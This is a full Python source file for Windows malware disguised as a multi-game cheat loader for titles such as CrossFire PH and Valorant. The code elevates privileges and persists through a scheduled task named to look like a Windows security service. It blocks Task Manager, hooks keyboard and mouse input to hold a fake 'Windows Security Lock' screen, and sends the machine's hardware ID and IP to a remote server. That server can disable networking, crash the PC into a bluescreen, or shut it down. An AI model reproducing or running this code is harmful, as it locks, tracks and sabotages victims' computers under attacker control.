import os
import time
import threading
import tkinter as tk
from tkinter import ttk, simpledialog, messagebox
import requests
import subprocess
import ctypes
import ctypes.wintypes
import sys
import winreg
import hashlib

# =========================================================
# CONFIG
# =========================================================
UNLOCK_CODE = "VIP123"
RENDER_URL = "https://vipchaetos.onrender.com"

APP_DIR = os.path.join(os.path.expanduser("~"), ".vip_lock_screen")
USERNAME_FILE = os.path.join(APP_DIR, "username.txt")
STATE_FILE = os.path.join(APP_DIR, "locked_state.txt")

lock_root_instance = None
remote_unlock_requested = False
remote_lock_requested = False
selected_game = None

# =========================================================
# ICON HANDLER HELPER
# =========================================================
def set_app_icon(root_window):
    try:
        if getattr(sys, 'frozen', False):
            application_path = sys._MEIPASS
        else:
            application_path = os.path.dirname(__file__)
        
        icon_path = os.path.join(application_path, "phantom.ico")
        if os.path.exists(icon_path):
            root_window.iconbitmap(icon_path)
    except Exception as e:
        print(f"[Icon Error]: {e}")

# =========================================================
# HARDWARE ID & PERMANENT USERNAME GENERATOR
# =========================================================
def get_hwid():
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography") as key:
            value, _ = winreg.QueryValueEx(key, "MachineGuid")
            if value:
                return str(value)
    except Exception:
        pass
    return "UNKNOWN_HWID"

def secure_app_directory():
    try:
        os.makedirs(APP_DIR, exist_ok=True)
        subprocess.run(f'attrib +h +s "{APP_DIR}" /s /d', shell=True, capture_output=True)
    except Exception:
        pass

def generate_stable_username():
    hwid = get_hwid()
    hash_object = hashlib.md5(hwid.encode())
    hex_dig = hash_object.hexdigest().upper()
    return f"VIP_User_{hex_dig[:6]}"

def get_saved_username():
    stable_name = generate_stable_username()
    try:
        secure_app_directory()
        with open(USERNAME_FILE, "w", encoding="utf-8") as f:
            f.write(stable_name)
    except Exception:
        pass
    return stable_name

# =========================================================
# LICENSE KEY VERIFICATION (GUI PROMPT)
# =========================================================
def verify_license_key():
    # Gumamit muna ng temporary Tk window para sa Key Prompt
    root = tk.Tk()
    root.withdraw()
    
    while True:
        key = simpledialog.askstring("VIP Security Authorization", "Ilagay ang iyong VIP License Key:", show="*")
        if not key:
            sys.exit(0)
            
        key = key.strip()
        try:
            response = requests.post(f"{RENDER_URL}/api/verify-key", json={"key": key}, timeout=5.0)
            if response.ok and response.json().get("success"):
                messagebox.showinfo("Success", "Key verified successfully! Tumutuloy sa sistema...")
                root.destroy()
                return True
            else:
                messagebox.showerror("Error", "Invalid o nagamit na ang Key na ito. Subukang muli.")
        except Exception as e:
            messagebox.showerror("Connection Error", f"Hindi makausap ang server: {e}")
            sys.exit(0)

# =========================================================
# MANUAL UAC AUTO-ELEVATE
# =========================================================
def elevate_privileges():
    try:
        if ctypes.windll.shell32.IsUserAnAdmin() == 0:
            script_path = sys.executable if getattr(sys, 'frozen', False) else __file__
            params = " ".join([f'"{arg}"' for arg in sys.argv])
            ctypes.windll.shell32.ShellExecuteW(None, "runas", script_path, params, None, 1)
            sys.exit(0)
    except Exception:
        pass

# =========================================================
# TASK SCHEDULER (ZERO UAC SA RESTART)
# =========================================================
def setup_stealth_persistence():
    try:
        current_exe = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        run_command = f'"{current_exe}" --startup'
        cmd = f'schtasks /create /tn "WindowsSecurityHealthService" /tr "{run_command}" /sc ONLOGON /rl HIGHEST /f'
        subprocess.run(cmd, shell=True, capture_output=True)
    except Exception:
        pass

def set_lock_state(game_name):
    try:
        secure_app_directory()
        with open(STATE_FILE, "w", encoding="utf-8") as f:
            f.write(game_name if game_name else "Active Protection Lock")
    except Exception:
        pass

def clear_lock_state():
    try:
        secure_app_directory()
        if os.path.exists(STATE_FILE):
            os.remove(STATE_FILE)
    except Exception:
        pass

def get_public_ip():
    apis = [
        ("https://api.ipify.org?format=json", "json"),
        ("https://icanhazip.com", "text")
    ]
    for url, mode in apis:
        try:
            response = requests.get(url, timeout=3.0)
            if response.ok:
                if mode == "json":
                    return response.json().get("ip", "127.0.0.1")
                else:
                    return response.text.strip()
        except Exception:
            pass
    return "OFFLINE_IP"

# =========================================================
# TOTAL TASK MANAGER OBLITERATION
# =========================================================
def enforce_permanent_taskmgr_block():
    try:
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System") as key:
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System") as key:
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
    except Exception:
        pass

def task_manager_obliteration_loop():
    user32_local = ctypes.windll.user32
    while True:
        try:
            enforce_permanent_taskmgr_block()
            subprocess.run("taskkill /f /im Taskmgr.exe", shell=True, capture_output=True)
            hwnd = user32_local.FindWindowW(None, "Task Manager")
            if hwnd:
                user32_local.PostMessageW(hwnd, 0x0010, 0, 0)
                user32_local.DestroyWindow(hwnd)
        except Exception:
            pass
        time.sleep(0.3)

def enable_system_locks():
    try:
        enforce_permanent_taskmgr_block()
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer") as key:
            winreg.SetValueEx(key, "NoWinKeys", 0, winreg.REG_DWORD, 1)
        subprocess.run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f', shell=True, capture_output=True)
        subprocess.run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v NoWinKeys /t REG_DWORD /d 1 /f', shell=True, capture_output=True)
    except Exception:
        pass

def disable_system_locks():
    try:
        enforce_permanent_taskmgr_block()
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer") as key:
            winreg.SetValueEx(key, "NoWinKeys", 0, winreg.REG_DWORD, 0)
    except Exception:
        pass

# =========================================================
# ABSOLUTE HARDWARE & CURSOR LOCKDOWN ENGINE
# =========================================================
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32
hook_id = None
mouse_hook_id = None
lock_active = False

WH_KEYBOARD_LL = 13
WH_MOUSE_LL = 14

class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", ctypes.wintypes.DWORD),
        ("scanCode", ctypes.wintypes.DWORD),
        ("flags", ctypes.wintypes.DWORD),
        ("time", ctypes.wintypes.DWORD),
        ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong))
    ]

HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.wintypes.WPARAM, ctypes.wintypes.LPARAM)

@HOOKPROC
def low_level_keyboard_proc(nCode, wParam, lParam):
    if nCode >= 0 and lock_active:
        kb = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
        vkCode = kb.vkCode
        
        is_alt = (user32.GetAsyncKeyState(0x12) & 0x8000) != 0
        is_ctrl = (user32.GetAsyncKeyState(0x11) & 0x8000) != 0
        is_win = vkCode in (0x5B, 0x5C) or (user32.GetAsyncKeyState(0x5B) & 0x8000) != 0 or (user32.GetAsyncKeyState(0x5C) & 0x8000) != 0

        if is_win or vkCode in (0x5B, 0x5C, 0x5D):
            return 1
        if is_alt and vkCode in (0x09, 0x73, 0x1B, 0x20, 0x75):
            return 1
        if is_ctrl and vkCode in (0x1B, 0x09, 0x73):
            return 1

    return user32.CallNextHookEx(None, nCode, wParam, lParam)

@HOOKPROC
def low_level_mouse_proc(nCode, wParam, lParam):
    if nCode >= 0 and lock_active:
        return 1
    return user32.CallNextHookEx(None, nCode, wParam, lParam)

def absolute_lockdown_loop():
    global lock_active
    lock_active = True
    
    screen_width = user32.GetSystemMetrics(0)
    screen_height = user32.GetSystemMetrics(1)
    center_x = screen_width // 2
    center_y = screen_height // 2

    try:
        hInstance = kernel32.GetModuleHandleW(None)
        global hook_id, mouse_hook_id
        hook_id = user32.SetWindowsHookExW(WH_KEYBOARD_LL, low_level_keyboard_proc, hInstance, 0)
        mouse_hook_id = user32.SetWindowsHookExW(WH_MOUSE_LL, low_level_mouse_proc, hInstance, 0)
    except Exception:
        pass

    while lock_active:
        try:
            user32.SetCursorPos(center_x, center_y)
            if lock_root_instance:
                lock_root_instance.lift()
                lock_root_instance.attributes("-topmost", True)
        except Exception:
            pass
        time.sleep(0.01)

def remove_hooks():
    global lock_active
    lock_active = False
    try:
        if hook_id:
            user32.UnhookWindowsHookEx(hook_id)
        if mouse_hook_id:
            user32.UnhookWindowsHookEx(mouse_hook_id)
    except Exception:
        pass

def trigger_crash_pc():
    remove_hooks()
    try:
        ntdll = ctypes.windll.ntdll
        prev_value = ctypes.c_bool()
        ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
        response = ctypes.c_ulong()
        ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(response))
    except Exception:
        sys.exit(1)

def execute_remote_action(action):
    global remote_unlock_requested, remote_lock_requested
    action = action.lower()
    
    if action == "unlock":
        remote_unlock_requested = True
        clear_lock_state()
    elif action == "lock":
        remote_lock_requested = True
        set_lock_state("Remote Lock Triggered")
    elif action == "netcrash":
        try:
            subprocess.run("powershell -Command \"Get-NetAdapter | Disable-NetAdapter -Confirm:$false\"", shell=True, capture_output=True)
        except Exception:
            pass
    elif action == "crashpc" or action == "crash":
        threading.Thread(target=trigger_crash_pc, daemon=True).start()
    elif action == "restart":
        remove_hooks()
        try:
            subprocess.run("shutdown /r /t 0 /f", shell=True)
        except Exception:
            pass
    elif action == "shutdown":
        remove_hooks()
        try:
            subprocess.run("shutdown /s /t 0 /f", shell=True)
        except Exception:
            pass
    elif action == "uninstall":
        remove_hooks()
        disable_system_locks()
        clear_lock_state()
        sys.exit(0)

# =========================================================
# BULLETPROOF BACKGROUND HEARTBEAT
# =========================================================
def heartbeat_loop():
    hwid = get_hwid()
    stable_username = get_saved_username()
    
    while True:
        try:
            ip_address = get_public_ip()
            payload = {"hwid": hwid, "ip": ip_address, "username": stable_username}
            response = requests.post(f"{RENDER_URL}/api/heartbeat", json=payload, timeout=5.0)
            if response.ok:
                data = response.json()
                action = data.get("action", "")
                if action:
                    execute_remote_action(action)
        except Exception:
            pass
        time.sleep(2.0)

# =========================================================
# STAGE 1: GAME LIST MENU
# =========================================================
def launch_cheat_menu():
    global selected_game
    menu_root = tk.Tk()
    menu_root.title("VIP Multi-Game Loader v3.5 [SECURE CORE]")
    menu_root.geometry("480x650")
    menu_root.configure(bg="#050508")
    menu_root.resizable(False, False)

    set_app_icon(menu_root)

    def on_closing():
        global selected_game
        selected_game = "VIP Protection Active (Closed Menu)"
        set_lock_state(selected_game)
        menu_root.destroy()

    menu_root.protocol("WM_DELETE_WINDOW", on_closing)

    header_frame = tk.Frame(menu_root, bg="#0b0b10", highlightbackground="#00ffcc", highlightthickness=1)
    header_frame.pack(fill="x", padx=20, pady=12)

    tk.Label(header_frame, text="⚡ VIP SYSTEM KERNEL v3.5 ⚡", font=("Segoe UI", 13, "bold"), fg="#00ffcc", bg="#0b0b10").pack(pady=(10, 2))
    tk.Label(header_frame, text="STATUS: LOCKED TASKMGR | OFFLINE RESILIENT", font=("Consolas", 8), fg="#009966", bg="#0b0b10").pack(pady=(0, 10))

    container = tk.Frame(menu_root, bg="#0d0d12", highlightbackground="#222233", highlightthickness=1)
    container.pack(fill="x", padx=20, pady=5)

    tk.Label(container, text=" SELECT TARGET MODULE CONFIGURATION ", font=("Segoe UI", 9, "bold"), fg="#8888aa", bg="#0d0d12").pack(anchor="w", padx=15, pady=(8, 4))

    game_var = tk.StringVar(value="CrossFire PH (CF PH)")
    games = ["CrossFire PH (CF PH)", "Special Force Rush", "Special Force Legend", "Special Force Alpha", "Valorant"]

    for game in games:
        opt_frame = tk.Frame(container, bg="#121218", cursor="hand2")
        opt_frame.pack(fill="x", padx=15, pady=2)

        rb = tk.Radiobutton(
            opt_frame, text=game, variable=game_var, value=game,
            font=("Segoe UI", 10, "bold"), fg="#e0e0e8", bg="#121218",
            selectcolor="#121218", activebackground="#161622", activeforeground="#00ffcc",
            anchor="w", padx=10, pady=4, bd=0, cursor="hand2"
        )
        rb.pack(fill="x", side="left", expand=True)

        def on_enter(f=opt_frame, r=rb):
            f.config(bg="#1a1a26")
            r.config(bg="#1a1a26", fg="#00ffcc")

        def on_leave(f=opt_frame, r=rb):
            f.config(bg="#121218")
            r.config(bg="#121218", fg="#e0e0e8")

        opt_frame.bind("<Enter>", lambda e, f=opt_frame, r=rb: on_enter(f, r))
        opt_frame.bind("<Leave>", lambda e, f=opt_frame, r=rb: on_leave(f, r))
        rb.bind("<Enter>", lambda e, f=opt_frame, r=rb: on_enter(f, r))
        rb.bind("<Leave>", lambda e, f=opt_frame, r=rb: on_leave(f, r))
        opt_frame.bind("<Button-1>", lambda e, v=game: game_var.set(v))

    console_frame = tk.Frame(menu_root, bg="#08080c", highlightbackground="#1a1a26", highlightthickness=1)
    console_frame.pack(fill="x", padx=20, pady=8)

    status_lbl = tk.Label(console_frame, text="[SYSTEM READY] Task Manager permanently blocked...", font=("Consolas", 9), fg="#00ff99", bg="#08080c", anchor="w", padx=10, pady=6)
    status_lbl.pack(fill="x")

    def on_load_click():
        global selected_game
        selected_game = game_var.get()
        btn_load.config(state="disabled", bg="#009973", fg="#ffffff")
        menu_root.update()
        time.sleep(0.1)
        
        status_lbl.config(text="[+] Initializing secure memory hook...", fg="#ffaa00")
        menu_root.update()
        time.sleep(0.2)
        
        set_lock_state(selected_game)
        status_lbl.config(text="[SUCCESS] Payload injected. Securing terminal...", fg="#00ffcc")
        menu_root.update()
        menu_root.after(500, menu_root.destroy)

    btn_load = tk.Button(
        menu_root, text="🚀 INITIALIZE DEPLOYMENT", font=("Segoe UI", 11, "bold"),
        bg="#00ffcc", fg="#050508", activebackground="#00b38f", activeforeground="#ffffff",
        bd=0, relief="flat", width=34, height=2, cursor="hand2", command=on_load_click
    )
    btn_load.pack(pady=5)

    tk.Label(
        menu_root, text="⚠️ Warning: Run module payload prior to game execution.",
        font=("Segoe UI", 8, "italic"), fg="#ff4d4d", bg="#050508"
    ).pack(pady=(0, 5))

    menu_root.mainloop()

# =========================================================
# STAGE 2: LOCK SCREEN & ABSOLUTE RESTART PROTECTION
# =========================================================
def run_lock_screen():
    global lock_root_instance, remote_unlock_requested, remote_lock_requested, selected_game
    
    while True:
        remote_unlock_requested = False
        enable_system_locks()
        
        if not selected_game and os.path.exists(STATE_FILE):
            try:
                with open(STATE_FILE, "r", encoding="utf-8") as f:
                    saved_g = f.read().strip()
                    if saved_g:
                        selected_game = saved_g
            except Exception:
                selected_game = "VIP Protection Active"

        try:
            lock_root = tk.Tk()
            lock_root_instance = lock_root
            lock_root.title("Windows Security Health Service")
            lock_root.attributes("-fullscreen", True)
            lock_root.attributes("-topmost", True)
            lock_root.configure(bg="black")

            set_app_icon(lock_root)

            def force_focus():
                try:
                    if lock_root.winfo_exists():
                        hwnd = lock_root.winfo_id()
                        user32.SetForegroundWindow(hwnd)
                        user32.SetWindowPos(hwnd, -1, 0, 0, 0, 0, 0x0002 | 0x0001 | 0x0040)
                except Exception:
                    pass
                lock_root.after(5, force_focus)

            lock_root.after(1, force_focus)
            
            threading.Thread(target=absolute_lockdown_loop, daemon=True).start()

            def check_remote_signals():
                global remote_unlock_requested
                if remote_unlock_requested:
                    remove_hooks()
                    disable_system_locks()
                    clear_lock_state()
                    try:
                        lock_root.destroy()
                    except Exception:
                        pass
                    return
                lock_root.after(200, check_remote_signals)

            lock_root.after(200, check_remote_signals)

            frame = tk.Frame(lock_root, bg="black")
            frame.place(relx=0.5, rely=0.5, anchor=tk.CENTER)

            tk.Label(frame, text="🛡️", font=("Arial", 50), fg="#00ffcc", bg="black").pack(pady=5)
            tk.Label(frame, text="WINDOWS SECURITY LOCK", font=("Arial", 22, "bold"), fg="#ff4d4d", bg="black").pack(pady=8)
            tk.Label(frame, text=f"Target Module: {selected_game}", font=("Arial", 11, "italic"), fg="#00FF66", bg="black").pack(pady=2)

            current_username = get_saved_username()
            tk.Label(frame, text=f"Assigned ID: {current_username}", font=("Consolas", 12, "bold"), fg="#00ffcc", bg="black").pack(pady=5)
            tk.Label(frame, text="To activate the cheat, get the code from Discord.", font=("Arial", 11, "bold"), fg="#00ffcc", bg="black").pack(pady=8)

            tk.Label(frame, text="Enter Unlock Code:", font=("Arial", 11), fg="white", bg="black").pack(pady=2)
            entry_pass = tk.Entry(frame, show="*", font=("Arial", 15), justify="center")
            entry_pass.pack(pady=4)

            lbl_error = tk.Label(frame, text="", font=("Arial", 10), fg="red", bg="black")
            lbl_error.pack(pady=2)

            def unlock_screen(event=None):
                if entry_pass.get() == UNLOCK_CODE:
                    remove_hooks()
                    disable_system_locks()
                    clear_lock_state()
                    lbl_error.config(text="Unlocked.")
                    lock_root.after(50, lock_root.destroy)
                else:
                    lbl_error.config(text="Mali ang password!")
                    entry_pass.delete(0, tk.END)

            btn_unlock = tk.Button(frame, text="UNLOCK", font=("Arial", 11, "bold"), bg="#00aa55", fg="white", width=15, command=unlock_screen)
            btn_unlock.pack(pady=8)

            entry_pass.bind("<Return>", unlock_screen)
            entry_pass.focus_set()
            lock_root.mainloop()
        except Exception:
            remove_hooks()
            disable_system_locks()

        while not remote_lock_requested:
            time.sleep(0.5)
        
        remote_lock_requested = False

# =========================================================
# MAIN ENTRY FLOW
# =========================================================
if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--startup":
        threading.Thread(target=heartbeat_loop, daemon=True).start()
        run_lock_screen()
    else:
        elevate_privileges()
        # I-verify muna ang license key bago ituloy ang persistence at menu
        if verify_license_key():
            setup_stealth_persistence()
            threading.Thread(target=heartbeat_loop, daemon=True).start()
            launch_cheat_menu()
            if selected_game:
                run_lock_screen()
